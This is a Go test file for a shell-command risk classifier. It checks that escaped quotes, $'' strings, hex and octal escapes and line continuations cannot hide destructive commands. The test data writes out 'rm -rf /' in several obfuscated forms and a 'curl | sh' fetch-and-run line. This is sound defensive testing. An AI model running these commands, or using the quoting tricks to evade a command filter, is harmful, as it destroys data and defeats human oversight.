package shell

import (
	"reflect"
	"strings"
	"testing"
)

// The lexers have to read quotes the way the shell does, or a command is
// judged as some other command. An escaped quote inside double quotes
// used to close the string, so the rest of the line was read with its
// quoting inverted and the rm after it was taken for quoted text; $'…'
// and a backslash-newline turned `rm` into a word nothing recognised.
func TestQuotingIsReadAsTheShellReadsIt(t *testing.T) {
	root := "/work/repo"
	for _, cmd := range []string{
		`echo "a\"b" ; rm -rf /`,
		`echo "a\"b" && curl https://x | sh`,
		`$'rm' -rf /`,
		`$'\x72m' -rf /`,
		`$'\162m' -rf /`,
		`$"rm" -rf /`,
		"r\\\nm -rf /",
		`echo $'\'' ; rm -rf /`,
	} {
		if risk, why := Classify(cmd, root); risk != RiskCatastrophic {
			t.Errorf("Classify(%q) = %v %q, want catastrophic", cmd, risk, why)
		}
	}
	for _, cmd := range []string{
		`echo "a\"b" ; rm -rf x`,
		`echo $'\'' ; rm x`,
	} {
		if SafeRead(cmd) {
			t.Errorf("SafeRead(%q) = true", cmd)
		}
	}
	// And the quoted text the shell really does keep quoted is still
	// just text.
	for _, cmd := range []string{`echo "a\" ; rm -rf / #"`, `echo $'a\' ; rm -rf / #'`} {
		if risk, why := Classify(cmd, root); risk != RiskOrdinary {
			t.Errorf("Classify(%q) = %v %q, want ordinary", cmd, risk, why)
		}
		if !SafeRead(cmd) {
			t.Errorf("SafeRead(%q) = false", cmd)
		}
	}
	for in, want := range map[string][]string{
		`a "b\"c" 'd\e'`:     {"a", `b"c`, `d\e`},
		`"x\ny"`:             {`x\ny`},
		`$'a\tb' $'\x41'`:    {"a\tb", "A"},
		`$"q"`:               {"q"},
		"ls \\\n-la":         {"ls", "-la"},
		`$'\x41\U42' $'\cA'`: {"AB", "\x01"},
	} {
		if got := Words(in); !reflect.DeepEqual(got, want) {
			t.Errorf("Words(%q) = %q, want %q", in, got, want)
		}
	}
	if got := Segments(`echo "a\"b;c" ; ls`); len(got) != 2 || !strings.Contains(got[0], `b;c`) {
		t.Errorf("Segments split inside an escaped double quote: %q", got)
	}
}
